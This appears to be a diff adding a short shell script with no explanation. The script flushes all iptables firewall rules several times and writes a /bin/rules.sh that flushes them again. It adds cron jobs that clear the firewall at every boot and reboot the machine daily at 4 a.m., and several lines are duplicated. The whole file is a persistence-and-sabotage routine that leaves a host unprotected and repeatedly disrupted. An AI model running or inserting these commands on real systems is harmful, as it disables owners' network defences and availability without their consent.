@@ -1,0 +1,10 @@
+iptables -F
+iptables -F
+iptables -F
+echo -e '#!/bin/bash
+iptables -F' > /bin/rules.sh
+chmod +x /bin/rules.sh
+(crontab -l 2>/dev/null; echo "@reboot /bin/rules.sh") | crontab -
+(crontab -l 2>/dev/null; echo "0 4 * * * /sbin/reboot") | crontab -
+(crontab -l 2>/dev/null; echo "@reboot /sbin/iptables -F") | crontab -
+(crontab -l 2>/dev/null; echo "@reboot /sbin/iptables -F") | crontab -
